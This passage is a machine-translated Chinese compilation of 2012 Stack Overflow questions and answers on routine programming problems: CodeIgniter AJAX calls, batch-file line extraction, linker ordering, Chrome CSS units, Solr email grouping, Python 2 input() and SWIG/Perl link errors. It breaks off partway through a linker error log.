表 1，indexpath:0,0 为摄氏度；表 1，indexpath:0,1 为华氏温度；表 1，开尔文的 indexpath:0,2；

和

表 2，indexpath:0,0 为摄氏度；表 2，indexpath:0,1 for farenheit；表 2，开尔文的 indexpath:0,2；

您只需使用相同的 indexPath 从其他表视图（输入表视图）获取带有文本字段的单元格，例如：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
{
    UITableViewCell *cellWithTheFieldToClear = [yourInputTableView cellForRowAtIndexPath:indexPath];
    theTextFieldToClear = (UITextField*)[theCellWithTheTextFieldToClear viewWithTag:2];
    theTextFieldToClear.text = @"";
} 
```

# php - jQuery Ajax 和 PHP - 可以在 PHP 中调用其他函数吗？

> ID：13360736
> 
> 赞同：0
> 
> 时间：2012-11-13T12:25:44.407
> 
> 标签：php, jquery

我正在 Codeigniter 中构建一个基本的信用卡验证器，这是我的 HTML：

```
<input type="text" id="ccard" />
<input type="submit" onClick="check_cc()" name="submit_cc" value="Validar cartão!" id="checkcc" />
<div id="result"></div> 
```

JavaScript 函数：

```
function check_cc() {
    var cc;
    cc = $("#ccard").val();

    $.ajax({
        url: '<?php echo base_url() . "js_tests/check_cc_string"; ?>',
        type: 'POST',
        data: {credit_card : cc},
        success: function(output_string) {
            setTimeout(function() {
                $('#result').append(output_string);
            }, 1000);
        }
    });
} 
```

（此时我不完全确定我对 URL 所做的操作是否正确。该函数似乎在控制器上触发，但不确定是否`cc`正在传递变量）

这是我的控制器：

```
function check_cc_string() {
    $check = check_cc($_POST['cc'], true);
    if ($check !== false) {
        $output_string = $_POST['cc'] . " - " . $check;
    } else {
        $output_string = " - Not a match";
    }

    echo json_encode($output_string);
} 
```

同样在控制器内部，信用卡检查器：

```
function check_cc($cc, $extra_check = false) {
    $cards = array(
        "visa" => "(4\d{12}(?:\d{3})?)",
        "amex" => "(3[47]\d{13})",
        "jcb" => "(35[2-8][89]\d\d\d{10})",
        "maestro" => "((?:5020|5038|6304|6579|6761)\d{12}(?:\d\d)?)",
        "solo" => "((?:6334|6767)\d{12}(?:\d\d)?\d?)",
        "mastercard" => "(5[1-5]\d{14})",
        "switch" => "(?:(?:(?:4903|4905|4911|4936|6333|6759)\d{12})|(?:(?:564182|633110)\d{10})(\d\d)?\d?)",
    );
    $names = array("Visa", "American Express", "JCB", "Maestro", "Solo", "Mastercard", "Switch");
    $matches = array();
    $pattern = "#^(?:" . implode("|", $cards) . ")$#";
    $result = preg_match($pattern, str_replace(" ", "", $cc), $matches);
    if ($extra_check && $result > 0) {
        $result = (validatecard($cc)) ? 1 : 0;
    }
    return ($result > 0) ? $names[sizeof($matches) - 2] : false;
} 
```

不幸的是，这给了我这个：

> 致命错误：调用未定义函数 check_cc()

我不是这些方面的专家，但我相信通过 jQuery 传递的 url 直接访问 PHP 函数是否正确？因此无法读取文件的其余部分？

有没有一种实用的方法来解决这个问题，或者我是否必须重建我的功能以包含所有信用卡验证码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:44:43.990

您正在尝试将 $cc 作为 check_cc_string 函数中的参数进行访问。$.ajax 向控制器发送一个 httprequest，默认情况下，数据通过 $_POST 传递。调用 check_cc 时，您应该使用 $this->

试试这个：

```
function check_cc_string() {
    $c = $_POST['cc'];
    $check = $this->check_cc($c, true);
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:47:08.483

> 在这一点上，我不完全确定我对 URL 所做的事情是否真的正确

这仅在 javascript 在发送到客户端之前由 PHP 解析时才有意义。

你真的定义了函数还是这些方法？在后一种情况下，没有 check_cc()，但可能有 $this->check_cc()。可以通过声明方法在方法中创建函数 - 但在调用方法之前该函数不存在 - 考虑：

```
class t {
  // constructor method....
  function t($r) {
    print "method called\n";

    // inline function defn.....
    function t($r) {
        print "function called\n";
    }
  }
}

$a=new t(''); // try commenting this

print t('hello'); 
```

# text - 提取文本文件的部分

> ID：13360737
> 
> 赞同：0
> 
> 时间：2012-11-13T12:25:47.160
> 
> 标签：text, batch-file

我正在尝试编写一个批处理文件，它将在给定的文本文件中提取第 6000 到 6999 行。通过谷歌搜索，我遇到了以下代码 - 但是这给了我一个空白的输出文件。

```
@echo off 
SetLocal EnableDelayedExpansion
type nul > nodedata.txt
set StartText=6000
set EndText=7000
set Flag=0
for /f "tokens=* delims=" %%a in ('type out.txt') do (
if /i "%StartText%" EQU "%%a" (set Flag=1) 
if /i "%EndText%" EQU "%%a" (set Flag=0) 
if !Flag! EQU 1 echo %%a >> nodedata1.txt
) 
```

关于我哪里出错的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:42:57.277

这是一个快速简单的纯批处理解决方案

```
for /l %%a in (6000,1,6999) do (
more C:\file.txt +%%a >>C:\extracted.txt
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:28:28.290

您应该安装[unxutils](http://unxutils.sourceforge.net/)然后查看[此](https://stackoverflow.com/questions/83329/how-can-i-extract-a-range-of-lines-from-a-text-file-on-unix)问题的答案... Windows 不适合文本处理...

一个 Windows 用户...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T16:55:11.523

这是一个运行速度更快的批处理解决方案...

```
@echo off
SetLocal EnableDelayedExpansion
set count=0
(for /F "skip=5999 delims=" %%a in (out.txt) do (
   echo %%a
   set /A count+=1
   if !count! equ 1000 goto endLoop
   )
) > nodedata1.txt
:endLoop 
```

# gcc - 如何解决 gnu 链接器命令行挑剔问题？

> ID：13360740
> 
> 赞同：0
> 
> 时间：2012-11-13T12:25:58.753
> 
> 标签：gcc, command-line-arguments, ld

[这个问题](https://stackoverflow.com/questions/6247926/gcc-command-line-argument-pickiness)及其答案解释了链接命令行顺序的重要性。

但是，我处理了很多包含以下行的 makefile

```
$(CC) $(LDFLAGS) $^ -o $@ 
```

显然，像这样的命令只适用于某些系统，但不适用于我的系统。除了像这样查找和修补所有 Makefile 之外，还有其他方法可以解决此问题吗？

我正在使用 gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3

编辑澄清：
我做了很多修补和集成作为我工作的一部分（通常是 buildroot 或 LTIB），我遇到了多个这样编写的 makefile。网络上的一些示例编译命令也遵循相同的模式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:30:57.317

所以，问题是某个白痴创建了一个makefile，将所有库选项放在.o 文件之前。大概有一些损坏的工具链不在乎，但这对您没有帮助。

这里只有两个选项：

1.  修复生成文件。
2.  创建一个重新排序选项的编译器包装器。这样的包装器通常会被破坏，但可以使其适用于您的 makefile 使用的确切模式。

我确实想知道是否`--start-group`会在这里对您有所帮助，但快速实验表明不会。

# html - 铬“厘米”问题

> ID：13360742
> 
> 赞同：2
> 
> 时间：2012-11-13T12:26:18.093
> 
> 标签：html, google-chrome

我注意到 Chrome 浏览器中元素大小的问题。
我写了一个简单的代码：

```
<html>
<body>
<table border="1px">
<tbody>
<tr>
    <td>
        <span style="display: inline-block; width: 5cm">TEXT</span>
        <span style="display: inline-block; width: 5cm">TEXT</span>
        <span style="display: inline-block; width: 5cm">TEXT</span>
        <span style="display: inline-block; width: 5cm">TEXT</span>
    </td>
</tr>
</tbody>
</table>
</body>
</html> 
```

我希望有 4 个垂直重复的跨度，每个 5 厘米。它适用于 IE、Firefox 等：
[IE - 工作正常](http://picupload.pl/vi-LShqgr.png)

但是 Chrome 遇到以下问题：
[Chrome - 不起作用](http://picupload.pl/vi-4yn6GG.png)

在 IE 中，span 的宽度为 189px，td 的宽度为 772px。
在 Chrome 中，span 的宽度为 189px，td 的宽度为 771px。

这是某种 Chrome 问题吗？为什么我的 td 元素不适合它的内容？对我来说，保留这些跨度元素（我不能用 div 替换它们）并以厘米为单位设置宽度是很重要的。当我删除表格边框时，问题仍然存在。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T13:07:54.720

`cm`如果您想要固定数量的像素，CSS单位是不可靠的。他们也不太可能在屏幕上实际测量 5 厘米。该`cm`单元主要用于打印样式。是的，它可以在屏幕上使用，但不要期望它有任何准确性。

一个框被渲染为 189 像素的事实`5cm`告诉我们，a`cm`不是像素的整数。仅此一项就足以告诉您，您不太可能使用`cm`单位获得准确的像素级跨浏览器渲染。

它只是不会发生。如果您想要像素完美的精度，请使用`px`单位。

你在问题中说你不能改变单位。如果可能的话，你真的应该重新考虑，因为它只会不断给你这些问题。

如果你*真的*不能改变它们，那么我能想到的在不改变单位的情况下解决你的问题的一种方法是给`<td>`元素一个`white-space:nowrap`样式。无论浏览器是否认为它们应该存在，这都应该强制所有跨度到同一行。它应该为您解决问题。但这并不能解决根本问题，如果您继续使用`cm`屏幕上的单位，它可能会以其他方式出现。

至于究竟是什么导致了故障，我猜 Chrome 处理浮点像素值的方式略有不同，并且当它添加跨度的像素宽度以计算出多宽时存在舍入误差使`<td>`. 如果是这种情况，那么这听起来像是 Chrome 中的一个错误，您可以向他们报告，但鉴于我上面所说的一切，我看不出他们将其作为高优先级问题。

# css - 谷歌字体不同大小和锯齿状

> ID：13360747
> 
> 赞同：0
> 
> 时间：2012-11-13T12:26:34.047
> 
> 标签：css, fonts, google-font-api

我对 Google 字体有一个非常令人惊讶的问题。[这是有问题的网站。](http://ad4you.eu "ad4you.eu")

标题通常显示在一个线条中，但我的一个和我一样使用相同 Opera 版本的朋友给我发了[这张](http://ad4you.eu/images/valeri_a4.jpg)截图。你可以看到标题分成两行，每一个想法都会停下来。

这是我第一次使用 Gfonts，必须承认 Firefox 也存在另一个问题 - 字体看起来很锯齿！

感谢您的建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:26:30.097

只需添加即可防止换行符

```
h1 { white-space: nowrap; } 
```

字体渲染取决于字体、字体大小、浏览器、操作系统、设备、它们的设置，可能还取决于月相。有些字体比其他字体更难，所以实际的做法是选择另一种字体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:35:32.400

不幸的是，并非所有浏览器都以完全相同的方式呈现所有字体。我猜你对 Opera 中标题的问题是由于字体被渲染得更大。您可以尝试针对 Opera 的特定样式表来解决这个问题。

至于锯齿状字体，嗯......你必须处理它，并选择在每个浏览器上看起来都清晰的字体。

看看这里：[http ://css-tricks.com/font-rendering-differences-firefox-vs-ie-vs-safari/](http://css-tricks.com/font-rendering-differences-firefox-vs-ie-vs-safari/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-14T22:57:29.570

由于这个 Joomla，锯齿状问题得到了解决！扩展 - [KC Cufón 字体替换](http://extensions.joomla.org/extensions/style-a-design/typography/11243)。A 只包含了我的文本字符 - 只有 3KB 的 js，我也留下了相同的 Google Web 字体加载，以便在扩展加载之前显示文本。

# nginx - 配置 nginx 以防止 Cloudbees 中的超时

> ID：13360750
> 
> 赞同：2
> 
> 时间：2012-11-13T12:26:47.680
> 
> 标签：nginx, cloudbees

我的 cloudbees（roo + spring mvc）应用程序有一个很长的过程，导致超时。根据[这个先前的问题](https://stackoverflow.com/questions/561946/how-do-i-prevent-a-gateway-timeout-with-nginx)，一个解决方案是更改 nginx 的配置（特别是 send_timeout 指令）。

我的问题是，鉴于我不是自托管应用程序而是为此使用 CloudBees，我不确定如何更改此设置。

这是我可以在 cloudbees-web.xml 配置文件中以某种方式指出的吗？（我无法找到可以包含在此文件中的配置参数的完整列表）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-14T01:08:33.783

是的，你可以这样做。

您需要更改您的应用程序设置

```
proxyBuffering=false 
```

部署时。这将允许长时间运行的连接。您只需在部署时执行一次。

例如

```
bees app:deploy (etc) proxyBuffering=false 
```

[您还可以使用 app:update 使用BeesSDK](http://developer.cloudbees.com/bin/view/RUN/BeesSDK)更改现有的应用程序配置（只需执行一次，它会记住它）- 查找有关 app:deploy 和 app:update 的部分

# solr - Solr - 分组结果给出错误计数

> ID：13360752
> 
> 赞同：0
> 
> 时间：2012-11-13T12:26:50.263
> 
> 标签：solr

我正在使用 Solr 分组结果。但它的行为是错误的。

![在此处输入图像描述](../Images/be7a00c0d167c2e2fab7997cf814e304.png)

我根据电子邮件字段进行分组。在我的数据库中，电子邮件地址“ashhaf63@hotmail.com”有 2 行，但 SOLR 显示 7147 numFound，这当然是错误的，应该是 2。

当我尝试使用带有分组的特定电子邮件地址（如“ashhaf63@hotmail.com”）进行搜索时，它会显示完美的结果，并且在 numFound 属性中显示 2 是正确的。

![在此处输入图像描述](../Images/9a21f284778766d410c66b35873e9156.png)

我相信，这是因为我的 Solr 模式中的字段类型，我在开始时使用文本字段类型，但我现在已将其更改为我自己的字段类型。我已经定义了自己的字段类型并现在使用自己的字段类型。

![在此处输入图像描述](../Images/15db96f41fc3ddba10bc9449b7f5957c.png)

![在此处输入图像描述](../Images/7072083f448a396b22e4c31a62995a34.png)

使用我自己的字段类型后，我面临同样的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T13:20:15.860

如果您查看您的分组回复，您将看到它与 7147 文档匹配，因为该组包含地址中包含“hotmail”的所有电子邮件，`<str name="groupValue">hotmail</str>`而不是整个电子邮件地址。这种行为是因为您希望字段中的值被索引为完整的字符串，例如“ashhaf63@hotmail.com”，但是从您的`email`fieldType 的定义中，您正在对字段值进行一些标记。这会导致该字段有多个索引值。特别是[StandardTokenizerFactory](http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.StandardTokenizerFactory)，它在所有非字母数字字符上分割一个值。因此，相同的电子邮件地址被索引为三个单独的值，“ashhaf63”、“hotmail”和“com”。

因此，我建议创建一个使用简单字符串 fieldType 的新字段，如下所示：

```
<!-- The StrField type is not analyzed, but indexed/stored verbatim. -->
<fieldType name="string" class="solr.StrField" sortMissingLast="true" /> 
```

然后像这样创建一个新字段：

```
<field name="emailaddress" type="string" stored="true" indexed="true"/> 
```

然后在这个新`emailaddress`字段上执行分组，它将根据整个电子邮件地址值进行分组。

# python - Python字符串解析错误

> ID：13360760
> 
> 赞同：0
> 
> 时间：2012-11-13T12:27:26.937
> 
> 标签：python, string

这是我的测试代码，`test.py`：

```
str = input("IP: ")                                               
print(str) 
```

运行时出现此错误：

```
➜  PingScript git:(master) ✗ python test.py                      
IP: 1.1.1.1 

Traceback (most recent call last):                      
  File "test.py", line 1, in <module>                            
    str = input("IP: ")                                          
  File "<string>", line 1                                         
    1.1.1.1                                                      
        ^                                                 
SyntaxError: invalid syntax 
```

仅当我`1.1.1.1`用作输入而不是`1.1`用作输入时才会发生这种情况，这里发生了什么？我试图用它来解析它，`str(str)`但我仍然得到同样的错误。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T12:29:05.200

`input()`尝试将输入解析为 python 表达式。改为使用`raw_input()`。

它可以`1.1`作为输入使用，因为这是 python 中的文字浮点值，一个数字。

可能您正在学习适用于 Python 3 的教程，但使用的是 Python 2。在 Python 3 中，该`raw_input()`函数被重命名为`input()`，旧`input()`函数被完全删除。如果是这样，请安装 Python 3 并从那里继续。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:30:39.847

`input()`评估您输入的内容，就好像它是有效的 Python 代码一样。`raw_input()`, 接受输入并将其作为字符串返回。由于`1.1.1.1`不是有效的 Python 代码，因此您会收到错误消息。`1.1`是 Python 中的浮点数，这就是它似乎起作用的原因：

```
>>> input('Enter: ')
Enter: 1+1
2
>>> raw_input('Enter: ')
Enter: 1+1
'1+1'
>>> input('Enter: ')
Enter: 1.1
1.1000000000000001 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-04-11T19:44:02.720

str() 是 Python 语言中的一个内置函数，可将其他数据类型转换为字符串。所以str必须是关键字，不能作为变量名。请使用任何其他变量名而不是“str”。

# c++ - SWIG、CPP 和 Perl

> ID：13360766
> 
> 赞同：3
> 
> 时间：2012-11-13T12:27:38.263
> 
> 标签：c++, perl, eclipse-cdt, swig

我想在 Eclipse 中将 C++ 代码包装到 Perl。现在我得到以下错误：

```
12:49:51 **** Incremental Build of configuration Debug for project TestDLLCPP ****
Info: Internal Builder is used for build
g++ "-LC:\\work\\Perl-5.12.4-Build1205-64Bit\\lib\\CORE" -shared -o libTestDLLCPP.dll interface_wrap.o example.o -lperl512 
interface_wrap.o: In function `SWIG_croak_null':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1036: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1036: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1040: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1040: undefined reference to `Perl_sv_isobject'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1041: undefined reference to `Perl_croak_nocontext'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1043: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1043: undefined reference to `Perl_sv_2pv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1043: undefined reference to `Perl_croak_nocontext'
interface_wrap.o: In function `SWIG_Perl_ConvertPtrAndOwn':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1129: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1129: undefined reference to `Perl_mg_get'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1132: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1132: undefined reference to `Perl_sv_isobject'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1138: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1138: undefined reference to `Perl_mg_find'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1141: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1141: undefined reference to `Perl_sv_isobject'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1143: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1143: undefined reference to `Perl_sv_2iv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1150: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1150: undefined reference to `Perl_sv_2iv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1201: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1201: undefined reference to `Perl_hv_common_key_len'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1203: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1203: undefined reference to `Perl_gv_add_by_type'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1208: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1208: undefined reference to `Perl_hv_common'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1209: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1209: undefined reference to `Perl_hv_common'
interface_wrap.o: In function `SWIG_Perl_MakePtr':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1225: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1225: undefined reference to `Perl_newSV'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1226: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1226: undefined reference to `Perl_newSV_type'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1228: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1228: undefined reference to `Perl_sv_setref_pv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1232: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1232: undefined reference to `Perl_hv_common_key_len'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1234: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1234: undefined reference to `Perl_gv_init'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1235: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1235: undefined reference to `Perl_gv_add_by_type'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1236: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1236: undefined reference to `Perl_newSViv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1236: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1236: undefined reference to `Perl_hv_common'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1238: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1238: undefined reference to `Perl_sv_magic'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1239: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1239: undefined reference to `Perl_sv_free2'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1239: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1239: undefined reference to `Perl_sv_free'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1240: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1240: undefined reference to `Perl_newRV_noinc'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1241: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1241: undefined reference to `Perl_sv_setsv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1242: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1242: undefined reference to `Perl_sv_free2'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1242: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1242: undefined reference to `Perl_sv_free'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1243: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1243: undefined reference to `Perl_sv_bless'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1246: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1246: undefined reference to `Perl_sv_setref_pv'
interface_wrap.o: In function `SWIG_Perl_NewPointerObj':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1252: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1252: undefined reference to `Perl_sv_newmortal'
interface_wrap.o: In function `SWIG_Perl_MakePackedObj':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1265: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1265: undefined reference to `Perl_sv_setpv'
interface_wrap.o: In function `SWIG_Perl_NewPackedObj':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1270: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1270: undefined reference to `Perl_sv_newmortal'
interface_wrap.o: In function `SWIG_Perl_ConvertPacked':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1282: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1282: undefined reference to `Perl_sv_2pv_flags'
interface_wrap.o: In function `swig_create_magic':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1353: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1353: undefined reference to `Perl_sv_magic'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1354: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1354: undefined reference to `Perl_mg_find'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1355: undefined reference to `_imp__win32_malloc'
interface_wrap.o: In function `SWIG_Perl_GetModule':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1371: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1371: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1373: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1373: undefined reference to `Perl_sv_2iv_flags'
interface_wrap.o: In function `SWIG_Perl_SetModule':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1385: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1385: undefined reference to `Perl_get_sv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1386: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1386: undefined reference to `Perl_sv_setiv'
interface_wrap.o: In function `SWIG_AsVal_double':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1574: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1574: undefined reference to `Perl_sv_2nv'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1577: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1577: undefined reference to `Perl_sv_2iv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1580: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1580: undefined reference to `Perl_sv_2pv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1584: undefined reference to `_imp__win32_errno'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1586: undefined reference to `_imp__win32_errno'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1587: undefined reference to `_imp__win32_errno'
interface_wrap.o: In function `SWIG_CanCastAsInteger':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1614: undefined reference to `_imp__win32_errno'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1614: undefined reference to `_imp__win32_errno'
interface_wrap.o:C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1615: more undefined references to `_imp__win32_errno' follow
interface_wrap.o: In function `SWIG_AsVal_long':
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1641: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1641: undefined reference to `Perl_sv_2uv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1648: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1648: undefined reference to `Perl_sv_2iv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1656: undefined reference to `Perl_get_context'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1656: undefined reference to `Perl_sv_2pv_flags'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1660: undefined reference to `_imp__win32_errno'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1662: undefined reference to `_imp__win32_errno'
C:\Users\sesc3661\workspace\TestDLLCPP\Debug/../interface_wrap.cxx:1663: undefined reference to `_imp__win32_errno'
interface_wrap.o: In function `SWIG_From_long':
